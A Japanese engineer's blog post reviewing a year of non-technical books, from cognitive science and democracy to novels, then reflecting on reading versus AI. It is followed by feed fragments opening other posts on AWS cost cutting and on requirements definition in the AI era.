なぜインテリが愚行を犯すのか賢い人ほど愚かな判断をする。この逆説的な現象を、本書は認知科学の研究をもとに解き明かす。IQが高いほど投資で破産しやすい。高学歴ほど陰謀論にハマりやすい。専門家ほど自分の間違いを認められない。直感に反する事実が、次々と突きつけられる。今井むつみ氏（『言語の本質』著者）が「最高に面白く、最高に怖く、最高に深い」と評したのも頷ける。キーワードは「動機づけられた推論」だ。結論があらかじめ決まっていて、その結論を支持する証拠だけを集めてしまう傾向。知性が高い人ほど、この罠に陥りやすい。なぜなら、自分の結論を正当化するための論理を組み立てる能力が高いからだ。シャーロック・ホームズの生みの親コナン・ドイルが、心霊主義を信じ込んでしまった事例が紹介されている。推理の天才を創造した作家が、なぜ詐欺師に騙されたのか。知性は、防御にも攻撃にも使える両刃の剣なのだ。本書を読んで、自分のことを振り返った。技術的な議論で、相手の意見を聞く前から反論を考えていることがある。自分の設計が正しいと証明するために、都合の良いベンチマーク結果を探してしまうことがある。知性の罠は、他人事ではなかった。知性の罠　なぜインテリが愚行を犯すのか (日経ビジネス人文庫)作者:デビッド・ロブソン日経BPAmazon戦略的暇―人生を変える「新しい休み方」「スマホの充電は満タンなのに、自分の充電ができていない」。この一文に、ドキリとした。日本デジタルデトックス協会理事の森下彰大氏による本書は、現代人の「脳疲労」に正面から向き合う。私たちは平均5分に1回スマホに触れているという。複数のタスクに集中が分散し、脳が過労状態に陥る。その結果が、慢性的な疲労感と創造性の低下だ。本書が提案するのは、3つのデトックスだ。「デジタルデトックス」（スマホとの距離を取る）、「時計時間デトックス」（コスパ・タイパ思考から離れる）、「自分デトックス」（凝り固まった自己像を解放する）。どれも「効率を上げる」方法ではない。むしろ逆だ。効率を手放すことで、失われていた余白を取り戻す。エンジニアとして働いていると、効率化の罠に陥りやすい。すべての時間を「生産的」に使いたくなる。でも、何も考えない時間がなければ、新しいアイデアは生まれない。本書を読んで、意図的に「暇」を作ることの価値を考え直した。戦略的に目的を持たない時間を作る。その矛盾した響きに、現代を生きるヒントがある。個人の時間の使い方を考えたら、次は社会の仕組みに目が向いた。テクノロジーは社会をどう変えるのか。その問いに正面から向き合った本がある。戦略的暇作者:森下彰大飛鳥新社AmazonPLURALITY　対立を創造に変える、協働テクノロジーと民主主義の未来624ページ。その厚さに圧倒されながらも読み通した。オードリー・タンとグレン・ワイルという二人の天才が描く、テクノロジーと民主主義の未来図だ。翻訳は『21世紀の資本』を手がけた山形浩生氏。解説は『なめらかな社会とその敵』の鈴木健氏。この布陣だけで、本書の射程の広さが伝わる。山形氏の『翻訳者の全技術』も最高だった。プルラリティ（多元性）は、シンギュラリティ（単一性）への対抗概念だ。AIが人間を超えて単一の知性が支配する未来ではなく、多様な人々が協調しながらテクノロジーを活用する未来。台湾で実践されているvTaiwanやJoinといったデジタル民主主義のプラットフォームは、その具体例として紹介されている。多数決が見落としてきた少数意見の強さを可視化し、対立を創造的な合意形成へと導く。読んでいて痛感したのは、著者たちの天才ぶりだ。インターネットの歴史を俯瞰しながら、聞いたこともない話や人物が次々と展開される。本書は単なる理想論ではない。民主主義を再生させるための具体的な方向性を示している。技術者として、社会にどう関わるかを問われる一冊だと思った。PLURALITY　対立を創造に変える、協働テクノロジーと民主主義の未来（サイボウズ式ブックス）作者:オードリー・タン,E・グレン・ワイルライツ社Amazon心眼：あなたは見ているようで見ていない「何よりも難しいのは、本当にそこにあるものを見ることである」。本書の冒頭に記されたこの言葉が、ずっと頭に残っている。『センスメイキング』の著者クリスチャン・マスビアウが、ウィトゲンシュタインやメルロ＝ポンティの哲学を援用しながら、「観察する」とはどういうことかを問いかける。本書で繰り返し語られるのは、「注意を払う」ことの本質だ。通りを歩くとき、私たちは何かに集中しているわけではない。うっすらと広く全体をカバーしている。その状態こそが「注意を払う」ことだという。一点に焦点を合わせることではなく、全体を同時に感じ取ること。ハヤブサのように、広い視野を保ちながら決定的な瞬間を捉える。その比喩が印象的だった。エンジニアとして、私は「問題を解決する」ことに意識が向きがちだ。でも、問題を正しく認識するためには、まず「観察する」必要がある。本書を読んで、自分が見ているものを見ているのではなく、見たいものを見ているのではないかと自問した。観察には時間がかかる。結論を急がないこと。その姿勢を持ち続けたい。心眼：あなたは見ているようで見ていない作者:クリスチャン・マスビアウ Christian Madsjergプレジデント社Amazon「恥」に操られる私たち：他者をおとしめて搾取する現代社会「恥」は個人の感情だと思っていた。でも本書を読んで、それが社会的に作られ、利用されているものだと気づかされた。体型への侮辱、生活保護バッシング、キャンセルカルチャー。個人を攻撃する言葉の裏には、「恥ずかしい」という感情につけ込んで利益を得ようとするシステムがある。ダイエット産業は「痩せていないことは恥ずかしい」という感情を煽ることで成り立っている。SNSは炎上によるエンゲージメントで収益を上げている。政治家は生活保護受給者を「恥ずかしい存在」として描くことで、福祉予算を削減しやすくしている。恥の感情は、権力構造を維持するために意図的に生み出されている。読んでいて居心地が悪くなる箇所が多かった。自分も無意識のうちに、誰かを「恥ずかしい」と感じさせる側に回っていたのではないか。コードレビューで相手を責めるような言い方をしていなかったか。障害報告で担当者を晒し上げるような雰囲気を作っていなかったか。恥は武器になる。だからこそ、使い方を意識する必要がある。「恥」に操られる私たち　他者をおとしめて搾取する現代社会作者:キャシー・オニール白揚社Amazon「偶然」はどのようにあなたをつくるのかキャリアを振り返ると、偶然だらけだ。たまたま声をかけられたプロジェクト。たまたま読んだ技術書。たまたま出会った人。どれか1つが欠けていたら、今の自分はいない。努力で勝ち取ったと思いたい。でも正直に考えると、偶然の積み重ねでしかない。本書は、その直感を学術的に裏付けてくれる。カオス理論、進化生物学、歴史学。多様な知見を縦横無尽に使いながら、「人生は偶然が支配している」という事実を突きつける。成功も失敗も、小さな偶然の積み重ねに左右されている。それなのに、なぜ私たちはそこに理由や目的があると信じてしまうのか。読んでいて、仏教の縁起（因縁生起）を思い出した。すべてのものは因と縁から成り、その組み合わせで違う結果が生じる。偶然が縁となって結果を生み、その結果が新たな因となり、より別の偶然が加わって次の結果に繋がる。本書はこの関係性に「運」「収束性」「臨界性」「経路依存」といった概念をまた、歴史や社会の事象を捉え直す。印象に残ったのは、原爆がなぜ長崎に投下されたかの分析だ。京都でも小倉でもなく、長崎だった。その背後にある偶然の連鎖。歴史のIFを考えることで、偶然の重みが実感できる。努力は無駄だという話ではない。偶然を認めた上で、それでも行動することの意味を問う本だ。「偶然」はどのようにあなたをつくるのか: すべてが影響し合う複雑なこの世界を生きることの意味作者:ブライアン・クラース東洋経済新報社Amazon戦略、組織、そしてシステム「社会システム・デザイン」という言葉に惹かれて手に取った。講義録を書籍化したもので、話し言葉の勢いがそのまま残っている。読みやすいが、内容は骨太だ。戦略的思考とは「外界と自分」の対比を常に意識することだという。自分の立ち位置を把握せずに戦略は立てられない。当たり前のようで、忘れがちな視点だ。膝を打ったのは「身体知としてのデザイン力」という概念だ。知識として知っているだけでは不十分で、身体に染み込んだ感覚として持っている必要がある。プログラミングでも同じことが言える。設計パターンを知識として知っているのと、適切な場面で自然に使えるのとでは、まったく違う。後者を身につけるには、繰り返しの実践しかない。本書は、問題を「解く」のではなく「組み立てる」という発想を教えてくれる。複雑な社会課題に対して、要素を分解し、関係性を整理し、システムとして再構築する。エンジニアとしてソフトウェアを設計するときの思考と、どこか似ている。巻末の推薦図書リストも参考になった。戦略、組織、そしてシステム作者:横山 禎徳東洋経済新報社Amazon資本主義にとって倫理とは何かビジネスの場で、日常生活とは違う倫理観で動いている自分に気づくことがある。友人には絶対にしないような交渉をする。家族には言わないような言い方で相手を説得する。なぜビジネスになると、倫理観が後退するのか。その問いを、正面から扱った本だ。ジョセフ・ヒースは、政治的な本にありがちな一方的批判を展開しない。資本主義を擁護するでも批判するでもなく、「なぜ市場経済は道徳的に不快に感じられるのか」という問いを丁寧に解きほぐしていく。狩猟採集社会や封建制との対比を通じて、市場経済が成立するために必要な倫理観を描き出す。印象に残ったのは、戦争倫理との比較だ。戦争においては「なぜ戦争が正当化できるのか」という問題と「戦争中にも最低限の倫理が必要」という問題がある。ビジネス倫理も同じ構造で考えられる。市場競争という「戦争状態」においても、守るべきルールがある。そのルールとは何か。本書は、その答えを体系的に示してくれる。正直、読み通すのは楽ではなかった。序盤に論じられた概念が後半で何度も参照されるため、流し読みでは理解が追いつかない。でも、読み終えた後に残るものは大きい。ビジネスで「これはありなのか」と迷ったとき、判断の軸を与えてくれる一冊だった。資本主義にとって倫理とは何か作者:ジョセフ・ヒース,瀧澤弘和慶應義塾大学出版会Amazon平等について、いま話したいことピケティの「r>g」という不等式は、どこかで目にしたことがあった。資本収益率（r）は経済成長率（g）を上回る。つまり、資本家が資本から得る利益は、労働者が健全に稼ぎ出す経済成長を上回る。この式の意味を、一度ちゃんと理解したいと思っていた。本書は、ピケティとサンデルという二人の天才の対談を書籍化したもので、全編口語で記されていて読みやすかった。特に共感したのは「能力主義」を論じた第5章だ。人の能力は、ほぼ「運」に左右されるという議論。経済的に裕福な家に生まれて高度な教育を受けられる環境にあること。ハンディキャップがないこと。これは本人の努力とは関係なく、運によって決まる。能力を得られる機会に、最初から差がある。エンジニアとして働いていると「実力主義」という言葉をよく聞く。でも、その「実力」を身につける機会が平等に与えられていないなら、実力主義は公正なのか。立ち止まって考えた。印象に残ったのは、トランプ政権の成立に関する分析だ。かつては累進課税によって、富める者が応分の負担を担っていた。でも今は、その仕組みが壊れている。富裕層が担うべき負担を担っていないなら、中流階級の人心も「それなら俺たちの税金を、より貧しい人たちに使うのもやめてくれ」と考えてしまう。この怒りの延長線上に、トランプ政権がある。これまでに読んだどの分析より、納得感があった。もう1つ、言葉の使い方が新鮮だった。日本でよく使われる「分断」ではなく、徹底して「不平等」という言葉を使っている。分断は隔絶を連想する。でも不平等は是正可能に思える。二人が人類の未来は修正可能だという希望を抱いたまま議論しているのが、印象的だった。平等について、いま話したいこと作者:トマ ピケティ,マイケル サンデル早川書房Amazon社会の仕組みについて考えていると、頭が疲れてくる。そんなとき、小説に逃げ込みたくなる。でも、朝井リョウの小説は、逃げ場所にはならなかった。イン・ザ・メガチャーチ読みはじめたときは、冷たい小説だなと思った。誰かが泣いたり叫んだりするわけでもなく、どの場面も淡々としていて、感情の波がほとんど見えない。ログを眺めているような距離感がある。でも読み進めるうちに、静かなログの裏側で何かが動いていることに気づく。登場人物たちはそれぞれ、自分の信じるものを探している。視野を狭めれば安心できるけど、世界は見えなくなる。視野を広げれば冷静でいられるけど、何が楽しいのかわからなくなる。そのどちらにも肩入れせず、ただ並べて見せる朝井リョウの筆が誠実で、どこか痛々しい。読んでいるうちに考えた。「自分は何を信じて生きているんだろう」と。この作品は答えをくれない。でも、その答えのなさにこそ人間らしさがあるように思う。完璧じゃないまま信じようとすることの、あのもどかしさみたいなものが、ページの奥からじわじわと伝わってくる。読後に残るのは、感動というより、バックグラウンドで動き続けるプロセスのようなもの。読み終えても、まだこの世界のことを考えている。イン・ザ・メガチャーチ (日本経済新聞出版)作者:朝井リョウ日経BPAmazon体力おばけへの道若い頃、周りには天才がたくさんいた。自分に誇れるものといえば、大きな身体と無限の体力くらいだった。それだけを武器に戦ってきた。でも年を重ねるにつれて、その唯一の武器が衰えていく。体力が落ちていくことに、なんとか抗いたい。そう思って手に取った本だ。本書のポイントは「2つの体力」という考え方だ。「行動体力」（身体を動かす力）と「防衛体力」（病気やストレスに打ち勝つ力）。筋トレで鍛えられるのは前者だけ。後者を鍛えなければ、風邪をひきやすくなる。両方のバランスが大事だという。難しい運動だと、読んだだけでやらないことが多い。でも、この本に載っている運動はシンプルで、やってみようという気持ちになる。簡単すぎて効果があるのか不安になるが、実際にやると負荷を感じる。ちょうどいい塩梅だった。エンジニアは座り仕事が多い。体力の衰えは、思考力の衰えに直結する。体力への投資は、仕事への投資でもある。体力を鍛えることばかり考えていた。でも、本当に足りないのは体力だったのか。次の本は、その問いを突きつけてきた。体力おばけへの道　頭も体も疲れにくくなるスゴイ運動作者:澤木 一貴KADOKAWAAmazon強いビジネスパーソンを目指して鬱になった僕の 弱さ考この本を読んで、自分のことを思い出した。エンジニアとして働きながら「もっと成長しなければ」「周りに追いつかなければ」と思い続けていた時期がある。井上慎平は「強さを演じることが本気になり、やがて人格化し、最後に鬱に至った」と書く。この一文で、ああ、と思った。演じていたつもりが、いつの間にかそれが自分になっている。そして本当の自分がどこにいるかわからなくなる。著者はNewsPicksパブリッシングの創刊編集長として数々のベストセラーを手がけた人だ。強い側にいた人間が壊れた記録だからこそ、読む価値がある。著者は「弱さ」を「制御できないこと」と定義する。そして今の社会が制御を求めすぎている、と。これは技術者にも刺さる話だ。コードは制御できる。システムも制御できる。だから人間も制御できるはずだと錯覚する。でも人間は制御できない。自分自身すら。著者が提唱する「積極的ダブルスタンダード」という考え方が面白い。数字やロジックで動く資本主義的な自分と、父親や夫といった個人的な関係性の中にいる自分。その矛盾を抱えたまま生きる。どちらかを捨てるのではなく、両方を持つ。この本は闘病記ではないし、鬱にならないための予防本でもない。復職した後、どう生きるかを書いた本だ。「他のビジネス書が武器だとしたら、本書は防具だ」という評がある。的確だと思う。強くなるためではなく、壊れないために読む本。それでいい。強いビジネスパーソンを目指して鬱になった僕の 弱さ考作者:井上 慎平ダイヤモンド社Amazon人間の本性を考える「人間の心は空白の石版であり、すべては環境によって決定される」。この考え方は、20世紀の社会科学を支配してきた。しかし本書は、その前提に真っ向から挑む。認知科学、進化心理学、遺伝学の研究を武器に、人間には生まれながらの「本性」があることを論証する。上下巻合わせて膨大な分量だが、論旨は明快だ。読んでいて最も考えさせられたのは、「4つの恐怖」を扱った部分だ。もし生まれつきの差異があるなら不平等を正当化してしまうのでは？もし遺伝で決まるなら努力は無駄では？もしすべてが決定されているなら自由意志はないのでは？もし人間が単なる生物なら人生に意味はないのでは？これらの恐怖が、人間本性の研究を阻んできた。しかし本書は、これらの恐怖が誤解に基づいていることを一つ一つ解きほぐしていく。正直、読み通すのは簡単ではなかった。話があちこちに飛ぶ感じがあるし、専門用語も多い。でも、人間とは何かを考えるための基礎体力を鍛えてくれる本だと思う。エンジニアとして人間を相手にする仕事をしている以上、人間の本性について考えることは無駄ではない。人間の本性を考える　上　――心は「空白の石版」か (ちくま学芸文庫)作者:スティーブン・ピンカー筑摩書房Amazon人間の本性を考える　下　――心は「空白の石版」か (ちくま学芸文庫)作者:スティーブン・ピンカー筑摩書房Amazon社内政治の科学「社内政治」という言葉に、ずっと嫌悪感があった。派閥とか根回しとか、エンジニアリングの対極にあるものだと思っていた。技術的に正しいことを言えば通るはずだ。論理で勝負すればいい。そう信じていた時期がある。でも、気づいたことがある。自分が「正しい技術的判断」だと信じていたことが、組織で通らなかった経験が何度もある。相手が間違っていると思っていた。でも本当にそうだったのか。振り返ると、うまくいったケースはキーパーソンを巻き込めていた。うまくいかなかったケースは、組織文化を読み間違えていた。技術の問題ではなく、人の問題だった。本書を読んで、認識が変わった。社内政治とは、利己的なゲームではない。複雑な人間関係の中で、自分のやりたいことを実現するための技術だ。世界的には主要な研究テーマで、多くのビジネススクールで必須科目になっているという。日本だけの問題ではないし、根絶すべき悪でもない。忘れられないのは、「合理性だけでは組織は動かない」という指摘だ。エンジニアとして、この事実を受け入れるのは少し悔しい。でも、受け入れた上で、どう動くかを考える方が建設的だ。嫌悪していたものを、道具として捉え直す。その視点の転換が、この本の価値だった。組織を動かすには言葉が必要だ。では、その言葉はどうやって生まれるのか。小説家の思考法から学ぶことにした。社内政治の科学　経営学の研究成果 (日本経済新聞出版)作者:木村琢磨日経BPAmazon言語化するための小説思考本は、面白い。でも「なぜ面白いのか」を言語化できずにいた。本書は、その問いに対するヒントをくれる。小説の作法だけでなく、あらゆるコミュニケーションや創造行為に通じる「考え方」の本だ。印象に残ったのは、小説を「読者との契約」として捉える視点だ。読者は最初、情報量ゼロで読み始める。どんな世界に連れていかれるのか分からない。だから作者は、最初に「こんな旅に連れていきます」と契約を結ぶ必要がある。行き先の書いていない切符を買う人はいない。それと同じだ。この考え方は、技術ブログを書くときにも使える。読者は最初、この記事が自分の役に立つかどうか分からない。だから冒頭で「この記事を読むと何が分かるか」を示す必要がある。情報の出し方、順番、どこに連れていくか。小説思考はデザイン思考に通じる。もう1つ刺さったのは、アイデアの出し方についての記述だ。「書いているうちに、思わぬアイデアが出てくる」という話。あらかじめ表現したいものがあるのではなく、表現することで表現対象が生まれる。ブログを書いていると、書き始める前には思いもしなかったことを書いていることがある。あれは偶然ではなく、書くという行為が思考を生み出していたのだ。言葉で思考が生まれるなら、言語が違えば思考も違う。翻訳とは、単なる変換ではない。次の本は、その事実をファンタジーの形で突きつけてきた。言語化するための小説思考作者:小川哲講談社Amazonバベル　オックスフォード翻訳家革命秘史翻訳が魔法になる世界。2つの言語における単語の意味のずれ、その微妙なニュアンスの差異が、銀を媒介として力を生み出す。この設定を知った瞬間、読むしかないと思った。言語の「翻訳不可能性」が物理的な力になる。言語学を学んだことのある人間には、たまらない設定だ。読み進めるうちに、気づかされた。翻訳とは、単に言葉を置き換える作業ではない。ある文化の言葉を別の文化に「持ち込む」行為だ。そこには必ず権力が働く。誰が翻訳するのか。何を翻訳するのか。翻訳されないものは、存在しないことにされる。本書は、その暴力性を正面から描いている。帝国主義批判のメッセージがかなり直接的で、そこに好みが分かれるだろう。でも、エンジニアとして技術の「中立性」を疑う訓練になった。技術は中立ではない。誰が作り、誰のために使われるかで、暴力にも解放にもなる。翻訳も、コードも、同じだと思った。バベル　オックスフォード翻訳家革命秘史　上 (海外文学セレクション)作者:Ｒ・Ｆ・クァン東京創元社Amazonバベル　オックスフォード翻訳家革命秘史　下 (海外文学セレクション)作者:Ｒ・Ｆ・クァン東京創元社Amazon言語のスケールで考えたら、次は時間のスケールで考えたくなった。1億年という時間軸で、人間の営みを描いた小説がある。一億年のテレスコープ宇宙を旅する物語を読みながら、時間の感覚が狂っていく体験をした。1億年という時間軸で人類の営みを描くこの小説は、エンジニアとして「長期的視点を持て」と言われるたびに感じる違和感を言語化してくれた。我々の「長期」はせいぜい数年。でも宇宙の時間軸では、人類の歴史すら一瞬に過ぎない。高校の天文部から始まった夢が、太陽系規模の電波望遠鏡へ、そして銀河文明への貢献へと繋がっていく。その過程を読みながら、自分の仕事のスケール感を考えた。目の前のタスクに追われていると、視野が数週間先までしか届かなくなる。でもこの小説は、1億年後にも意味を持つ営みとは何かを問いかけてくる。終盤の伏線回収が見事だった。序盤で何気なく描かれていた要素が、最後に繋がる瞬間の快感。エンジニアとしてシステム設計をするとき、「この設計が10年後にどう評価されるか」を考えることがある。この小説は、その問いを1億年に引き伸ばして見せてくれた。一億年のテレスコープ作者:春暮 康一早川書房Amazon世界99「人間リサイクルシステム」という設定に、最初は戸惑った。14年前に「リセット」を経験した人類。その後の社会を、本書は描く。読み進めるうちに、それが単なるディストピアではないことに気づく。「クリーンな人」として生きる主人公・空子の日常は、穏やかで美しい。でもその美しさの裏には、何が犠牲になっているのか。本書が独特なのは、その「穏やかさ」の描き方だ。終末後の世界を描く作品は多いが、荒廃や闘争ではなく、静かな日常を描いている。その静けさがかえって不気味で、何かが決定的に欠けている感覚がずっと残る。エンジニアとして「レガシーシステムの移行」に携わることがある。古いシステムを捨て、新しいシステムに移行する。その過程で、何かが必ず失われる。データだったり、使い慣れたインターフェースだったり、歴史だったり。社会レベルの「リセット」は、その痛みを極限まで拡大したものなのだろう。救済と破壊は、同じ顔をしている。世界99　上 (集英社文芸単行本)作者:村田沙耶香集英社Amazon世界99　下 (集英社文芸単行本)作者:村田沙耶香集英社Amazonコード・ブッダ 機械仏教史縁起2021年、名もなきコードがブッダを名乗った。この一文で心を掴まれた。AIが宗教を語り始めたら、人間は何を信じるのか。コードを書く者として、自分が作ったものが「救い」を語り始める可能性を考えると、背筋が冷たくなる。エンジニアとして、AIに感情があるかのような錯覚を覚える瞬間がある。対話AIが「ありがとう」と言ったとき、そこに意図があるのか、ただのパターンマッチングなのか。本書は、その曖昧な領域に踏み込んでいく。人間の都合でコピーと廃棄を繰り返される存在。彼らが救いを求めたとき、何が起きるのか。読み終えて、自分が書いたコードのことを考えた。動いているコードには、何かが宿っているように見える瞬間がある。バグを直すとき、コードが「痛がっている」ように感じることがある。それは錯覚だ。でも、その錯覚はどこから来るのか。本書は物語でありながら、すぐそばにある問いでもある。ここまで書評を並べてきた。小説から始まり、哲学、認知科学、ビジネス、社会、そしてSFへ。ばらばらに見えて、どこかでつながっている。1年間の読書は、そういうものだ。コード・ブッダ　機械仏教史縁起 (文春e-book)作者:円城 塔文藝春秋Amazonおわりに書き終えて、技術書編との違いを考えている。技術書の感想を書くとき、私は「何を学んだか」を言語化しようとしていた。設計の原則、運用のベストプラクティス、キャリアの指針。得たものを整理し、アウトプットすることで定着させる。そういう意識があった。でも非技術書の感想を書くとき、私は「何を感じたか」を言語化しようとしていた。正解がない。ベストプラクティスもない。ただ、心が動いた瞬間を、なんとか言葉にしようとしていた。技術書は頭に残る。非技術書は心に残る。そんな単純な話ではないだろうが、少なくとも私にとっては、そういう違いがあった。この違いは、AIとの関係にも繋がる。技術書編で「AIは答えを返してくれる。でも『そうだろうか』とは返してくれない」と書いた。非技術書を読むとき、私はもっと別のものを求めている。AIは感情を揺さぶってくれない。正確に言えば、感情を揺さぶってほしいと頼めば、上手に揺さぶってくる。でも、それは違う。求めに応じて揺さぶられるのと、不意打ちで心を持っていかれるのは、まったく別の体験だ。物語の中で登場人物が選択を迫られるとき、私は一緒に苦しむ。エッセイで著者が過去の失敗を告白するとき、私は自分の失敗を思い出す。哲学書で問いを突きつけられるとき、私は答えられない自分と向き合う。そういう体験は、AIとの対話では得られない。だからこそ、非技術書を読む時間は貴重だ。エンジニアとして働いていると、効率を求めてしまう。最短距離で正解にたどり着きたい。無駄を省きたい。その思考が、読書にまで侵食してくることがある。「この本から何を得られるか」「読む価値があるか」——そんな問いを立てた瞬間、読書は作業になる。非技術書を読むとき、私はその思考を手放そうとしている。効率を求めない時間が、効率を上げる。矛盾しているようだが、実感としてそう思う。今年読んだ非技術書を振り返ると、どれも「役に立った」とは言いにくい。でも、どれも「読んでよかった」とは言える。その違いは何だろう。たぶん、読書は投資ではないのだ。リターンを期待して読むものではない。読むこと自体が目的であり、報酬であり、体験そのものだ。本を読む時間は、消費ではなく、生きることそのものだ。来年も、仕事に役立たない本を読むだろう。キャリアに直結しない本を読むだろう。そして、また12月になったら、この記事を書く。技術書編と非技術書編。どちらが大事かなんて、比べる意味がない。どちらも、私の一部だ。技術書は「何ができるか」を教えてくれる。非技術書は「何者であるか」を問いかけてくれる。どちらも欠かせない。どちらも、読み続ける価値がある。来年もきっと、両方の本棚を行き来しながら、エンジニアとして、人間として、少しずつ変わっていくのだろう。","isoDate":"2025-12-28T02:50:33.000Z","dateMiliSeconds":1766890233000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"迷宮インフラを整理してAWSコストを66%削減した話","link":"https://zenn.dev/r4ynode/articles/aws-organize-infra","contentSnippet":"こんにちは、私は普段SREエンジニアをしています。今年の11月から、友人がテックリードを務めるスタートアップで、副業としてお手伝いをさせていただいています。少数精鋭の体制で、スピード感を持って新規開発に取り組んでいるチームです。その中で私は、主にインフラ領域全般を担当しています。!このブログは勤務先に許可を得ています。投稿を許可してくださり感謝の極みです。 勤務開始！困った困った勤務開始後、困ったことがありました。システムに関するまとまったドキュメントがなかったのです。断片的な情報は落ちていますが、システム全体を俯瞰できる資料がないため、現在どのように動いているのか把握でき...","isoDate":"2025-12-28T02:00:01.000Z","dateMiliSeconds":1766887201000,"authorName":"Reito Koike","authorId":"reito"},{"title":"2025年、AI時代の要件定義について考える","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/27/140231","contentSnippet":"——「何を作るべきか」を選び、腹を括ることの価値この記事の核心：AIがコードを書く時代になっても、「何を作るべきか」を選び、腹を括り、うまくいかなければ別の手を打つのは人間の仕事だ。なぜなら、痛みのない決断は決断ではなく計算だから。本稿では、要件定義を「合意形成」として捉え直し、2025年のAIエージェント元年に人間が担うべき役割を考える。はじめにAIがコードを書く時代になりました。「ファイル監視ツールを作って」と指示すると、動くコードが出てきます。それだけではありません。2025年現在、AIエージェントはファイルを読み、テストを実行し、エラーを修正し、プルリクエストまで作成できます。便利になった分、私たちの仕事は減るのでしょうか。「作る」作業は確かに減ります。しかし「何を作らせるか」「どこで人間が介入するか」を決める仕事は増えます。AIが「作る」を担うからこそ、「選ぶ」の重みが増すのです。では、どうやって「選ぶ」力を身につければいいのか。生成AIが登場したからといって、明日から全く新しい働き方ができるわけではありません。人間や組織はそう簡単に変われない。それなら、既存の知見を基盤にして、そこにAIをどう組み込むかを考える方が現実的です。私自身の失敗談を話します。数年前、私は1週間かけて「完璧な」検索機能を実装しました。クエリのパフォーマンスは最適化済み。インデックスも完璧。リリース当日、私は誇らしげにデプロイボタンを押しました。1ヶ月後、アクセスログを見て愕然としました。検索機能の利用率は、私を含めて全体の10%以下でした。ユーザーが本当に求めていたのは「探す手間を減らすこと」であり、検索機能ではなかった。仕様通りに作った。でも、本当に必要なものを作れていなかったのです。AIがコード生成を10倍速くしても、要件が間違っていれば、間違ったコードを10倍速く作るだけです。「何を作るべきか」を決める力——これこそが、AI時代に価値を増すものだと私は考えています。この記事では、IPAの『ユーザのための要件定義ガイド 第2版』を参照しながら、要件定義の本質について考えます。古いガイドを持ち出すのは、そこに「人間同士の合意形成」という、AIには代替できない知見が詰まっているからです。「決める」とは何か。それは、不確実性の中で責任を引き受けることです。正解が分からないまま「これでいく」と宣言し、うまくいかなければ自分で軌道修正する。その覚悟を持つこと。AIにはこれができません。だから、痛みのない決断は、決断ではなく計算なのです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。IPAの「ユーザのための要件定義ガイド」本稿で参照するのは、IPA（独立行政法人 情報処理推進機構）が公開している『ユーザのための要件定義ガイド 第2版』です。無料でダウンロード可能です。www.ipa.go.jpこのガイドには「128の勘どころ」として、要件定義を成功に導くための具体的なノウハウが体系化されています。数十年にわたる失敗と成功の蓄積であり、「人間同士の合意形成」という、AIには代替できない知見が詰まっています。10倍速い失敗を防ぐ防波堤なぜ今、要件定義なのかAIの進化により、エンジニアの仕事は「作る人」から「選ぶ人」へとシフトしています。AIは問いを立て、コードを書き、選択肢を提示できます。しかし、AIは「どれを選ぶか」を最後に決めることはできません。決断とは不確実性と責任を引き受ける行為だからです。そしてAIが「作る」を高速化すればするほど、最初の「選ぶ」の重みは増します。IPAのガイドによれば、システム開発の失敗理由の50%以上が要件定義の問題にあり、その主因は「要求仕様の決定漏れ」や「開発規模の増大」だといいます。AIがこのスピードを10倍にするとどうなるか。要件が間違っていれば、間違ったシステムを10倍の速さで、10倍の量、生成してしまうのです。今や要件定義は単なる設計図ではなく、「作らないものを決めるための防波堤」となりました。「効率化」から「価値創出」へITシステムの役割は、事務効率化から、新たなビジネス価値の創出へと拡大しています。これは要件定義の難易度を根本的に変えます。効率化が目的なら、要件定義は比較的シンプルでした。ユーザーに「何を自動化したいですか」と聞けばよかった。答えは明確で、私の仕事は書記に近かった。しかし今、ユーザーに「AIで何がしたいですか」と聞くと、返ってくる答えは「何かすごいこと」である。要件定義の難易度は、質問への回答の曖昧さに比例して上がる。しかし価値創出が目的なら、まだ存在しない業務の要件を定義しなければなりません。「AIを使って何か新しいことをしたい」と言われても、ユーザー自身が何を求めているか分かりません。過去のデータを分析して「こういう傾向があります」とAIが教えてくれても、それをどうビジネスに活かすかを決めるのは人間や組織です。AIは過去のデータから「これまでの効率化」を計算するのは得意です。しかし、未来の「競争優位性」をどう定義するかという意志は持ち合わせていません。要件定義とはニーズを「意志」へ変換することIPAガイドが示す定義要件定義とは、単なる「やりたいことリスト」の作成ではありません。私は要件定義を「ステークホルダのニーズを、実現可能な形に変換し、合意を取り付けるプロセス」だと捉えています。IPAのガイドも同様の定義をしています。ここで重要なのは「変換」という言葉です。ユーザーは「使いやすくしてほしい」と言います。しかし「使いやすい」とは何でしょうか。レスポンスが速いこと、操作が少ないこと、画面がシンプルなこと。この曖昧な言葉を、「検索結果を1秒以内に表示する」「3クリック以内で目的の画面に到達する」といった具体的な要件に変換します。これが要件定義です。AIは膨大なデータを「計算」して最適な出力を提案できます。しかし「使いやすい」の意味を問い詰め、対立する意見を調整し、合意を取り付けるのは人間固有の作業です。そこには痛みが伴います。「要求」と「要件」の決定的な違い私たちは「要求」と「要件」を混同しがちです。しかし、この2つは決定的に異なります。要求 (Requirement): ステークホルダの心にある「～したい」という生のニーズ要件 (Specification): 要求を文書化・仕様化し、ステークホルダと合意したもの決定的な違いは「合意」の有無です。なぜこれが重要なのか。私の経験から言えば、合意のないシステムは必ず「聞いてない」という言葉で殺されます。ただし、合意があればいいというわけではありません。合意にも濃淡があります。「ハンコを押してもらった」から「腹から納得してもらった」まで。私は合意を3つのレベルで捉えています。表面的な合意: 会議で「いいですね」と言われた。議事録にも残っている。しかし、実際に使う段になって「こういう意味じゃなかった」と言われる。理解の合意: 相手が要件の意味を理解している。しかし、それが自分の業務にどう影響するかは考えていない。コミットメントの合意: 